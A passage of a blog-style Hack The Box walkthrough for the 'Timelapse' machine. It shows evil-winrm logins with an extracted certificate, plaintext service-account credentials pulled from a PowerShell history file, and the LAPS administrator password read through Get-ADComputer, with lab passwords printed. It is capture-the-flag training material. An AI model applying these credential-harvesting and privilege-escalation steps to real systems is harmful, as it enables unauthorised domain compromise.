+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
+Enter Import Password:
+</code></pre></div><p>now we have both files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ ls 
+legacyy_dev_auth.crt  legacyy_dev_auth.key 
+</code></pre></div><h2 id="evil-winrm--legacyy">
+  Evil-winrm | Legacyy
+  <a href="#evil-winrm--legacyy" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<blockquote>
+<p><strong>evil-winrm</strong> is a tool for evil-winrm connections from Linux</p>
+</blockquote>
+<p>Switched needed:</p>
+<ul>
+<li><strong>-S</strong> for enabling SSL</li>
+<li><strong>-c</strong> provide the public key certificate</li>
+<li><strong>-k</strong> provide the private key</li>
+<li><strong>-i</strong> host to connect to</li>
+</ul>
+<p>As the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ evil-winrm -i 10.10.11.152 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+
+Evil-WinRM shell v3.4
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>egacyy<span style="color:#ae81ff">\D</span>ocuments&gt;type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>egacyy<span style="color:#ae81ff">\d</span>esktop<span style="color:#ae81ff">\u</span>ser.txt 
+</code></pre></div><p>And we got user!</p>
+<h2 id="shell-as-svc_deploy">
+  Shell as svc_deploy
+  <a href="#shell-as-svc_deploy" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>After some fail enumeration attemps I end up with checking the powershell history file:</p>
+<p>(winpeas would also showed it)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; ls
+
+    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/3/2022  11<span style="color:#960050;background-color:#1e0010">:</span>46 PM            434 ConsoleHost_history.txt
+</code></pre></div><blockquote>
+<p>The file contains some powershell commands history, with connecting creds for the svc_deploy user:</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; type ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString <span style="color:#e6db74">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#39;svc_deploy&#39;</span>, $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+</code></pre></div><blockquote>
+<p>E3R$Q62^12p7PLlC%KWaxuaV</p>
+</blockquote>
+<p>I&rsquo;ll connect with svc_deploy creds on a new winrm session:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ evil-winrm -i 10.10.11.152 -u svc_deploy -p <span style="color:#e6db74">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> -S
+
+Evil-WinRM shell v3.4
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_deploy<span style="color:#ae81ff">\D</span>ocuments&gt; 
+</code></pre></div><h2 id="pe-root">
+  PE root
+  <a href="#pe-root" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>After some enumeration time also, If we check the Global Group memberships for the current user (svc_deploy).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; net user svc_deploy
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
+Country/region code          000 (System <span style="color:#66d9ef">Default</span>)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12<span style="color:#960050;background-color:#1e0010">:</span>12<span style="color:#960050;background-color:#1e0010">:</span>37 PM
+Password expires             Never
+Password changeable          10/26/2021 12<span style="color:#960050;background-color:#1e0010">:</span>12<span style="color:#960050;background-color:#1e0010">:</span>37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 12<span style="color:#960050;background-color:#1e0010">:</span>25<span style="color:#960050;background-color:#1e0010">:</span>53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+</code></pre></div><p><strong>LAPS_Readers</strong> It seems that we have access to read from <a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899" target="_blank">LAPS</a>
+.</p>
+<p>All what we need to read the password is <strong>Get-ADComputer</strong> for getting Active Directory computers and the <strong>ms-mcs-admpwd</strong> property for clear text password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; Get-ADComputer DC01 -property <span style="color:#e6db74">&#39;ms-mcs-admpwd&#39;</span>
+
+
+DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       <span style="color:#960050;background-color:#1e0010">:</span> dc01.timelapse.htb
+Enabled           <span style="color:#960050;background-color:#1e0010">:</span> True
+ms-mcs-admpwd     <span style="color:#960050;background-color:#1e0010">:</span> uM[3va(s870g6Y]9i]6tMu{j
+Name              <span style="color:#960050;background-color:#1e0010">:</span> DC01
+ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> computer
+ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    <span style="color:#960050;background-color:#1e0010">:</span> DC01$
+SID               <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName <span style="color:#960050;background-color:#1e0010">:</span>
+</code></pre></div><blockquote>
+<p>uM[3va(s870g6Y]9i]6tMu{j</p>
+</blockquote>
+<h2 id="-evil-winrm--root">
+  | Evil-winrm | Root
+  <a href="#-evil-winrm--root" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">werz@ctf01<span style="color:#960050;background-color:#1e0010">:</span>~/ctf/htb/timelapse$ evil-winrm -i 10.10.11.152 -S -u administrator -p <span style="color:#e6db74">&#39;uM[3va(s870g6Y]9i]6tMu{j&#39;</span>
+
+Evil-WinRM shell v3.4
+
+Warning<span style="color:#960050;background-color:#1e0010">:</span> SSL enabled
+
+Info<span style="color:#960050;background-color:#1e0010">:</span> Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type C:\Users\TRX\Desktop\root.txt
+</code></pre></div><p>yessir!</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://0xwerz.github.io/23/04/2022/late/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Late -- HTB walkthrough</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://0xwerz.github.io/19/02/2022/undetected/">
+                  <span class="button__text">Undetected -- HTB walkthrough</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
+      
+  </div>
+</footer>
+
+<script src="https://0xwerz.github.io/assets/main.js"></script>
+<script src="https://0xwerz.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
+}
+</script>
+
+    
+  </body>
+</html>
